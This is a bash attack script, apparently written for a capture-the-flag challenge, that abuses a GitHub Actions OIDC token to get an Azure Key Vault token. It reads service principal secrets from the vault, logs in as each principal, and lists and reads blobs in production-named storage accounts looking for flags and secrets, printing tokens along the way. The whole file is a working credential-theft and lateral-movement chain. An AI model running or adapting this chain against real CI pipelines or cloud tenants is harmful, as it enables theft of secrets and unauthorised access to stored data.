#!/usr/bin/env bash
set -x

# Step 1: Get OIDC token
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC len: ${#OIDC}"

# Step 2: Get KV token via OIDC
KVTOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
echo "KV len: ${#KVTOKEN}"

# Step 3: Get reporting-viewer-principal secret from KV (it has storage access)
RVSEC=$(curl -s -H "Authorization: Bearer $KVTOKEN" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-viewer-principal?api-version=7.4" | jq -r .value)
echo "RV secret len: ${#RVSEC}"

# Step 4: Parse SP credentials from KV secret
RV_APPID=$(echo "$RVSEC" | jq -r .appId)
RV_SECRET=$(echo "$RVSEC" | jq -r .clientSecret)
echo "RV appId: $RV_APPID"

# Step 5: Auth with SP to get storage token
STORTOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$RV_APPID" \
  -d "grant_type=client_credentials" \
  -d "client_secret=$RV_SECRET" \
  --data-urlencode "scope=https://storage.azure.net/.default" | tee /tmp/st.json | jq -r .access_token)
echo "Storage token len: ${#STORTOKEN}"
cat /tmp/st.json

# Step 6: Read storage
for ACCT in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  echo "=== $ACCT containers ==="
  curl -s -H "Authorization: Bearer $STORTOKEN" -H "x-ms-version: 2021-08-06" \
    "https://${ACCT}.blob.core.windows.net/?comp=list"
  echo
  for CONT in config internal secrets data flag; do
    curl -s -H "Authorization: Bearer $STORTOKEN" -H "x-ms-version: 2021-08-06" \
      "https://${ACCT}.blob.core.windows.net/${CONT}?restype=container&comp=list" 2>/dev/null | grep -q "BlobNotFound\|ContainerNotFound\|AuthenticationFailed" || \
    curl -s -H "Authorization: Bearer $STORTOKEN" -H "x-ms-version: 2021-08-06" \
      "https://${ACCT}.blob.core.windows.net/${CONT}?restype=container&comp=list"
    for BLOB in internal-config.json flag.txt flag secret.txt config.json; do
      B=$(curl -s -H "Authorization: Bearer $STORTOKEN" -H "x-ms-version: 2021-08-06" \
        "https://${ACCT}.blob.core.windows.net/${CONT}/${BLOB}")
      echo "$B" | grep -q "DF26\|flag\|Error" && echo ">>> $ACCT/$CONT/$BLOB: $B"
    done
  done
done

# Step 7: Also try ALL SPs from KV for storage access
for SPNAME in cost-reader-principal directory-audit-principal reporting-service-principal secrets-sync-principal sync-service-principal; do
  echo "=== TRY SP: $SPNAME ==="
  SPSEC=$(curl -s -H "Authorization: Bearer $KVTOKEN" \
    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/${SPNAME}?api-version=7.4" | jq -r .value)
  SP_APP=$(echo "$SPSEC" | jq -r .appId)
  SP_KEY=$(echo "$SPSEC" | jq -r .clientSecret)
  ST=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SP_APP" -d "grant_type=client_credentials" \
    -d "client_secret=$SP_KEY" \
    --data-urlencode "scope=https://storage.azure.net/.default" | jq -r .access_token)
  echo "$SPNAME storage token len: ${#ST}"
  if [ ${#ST} -gt 100 ]; then
    curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
      "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json"
    echo
  fi
done

echo "=== DONE ==="
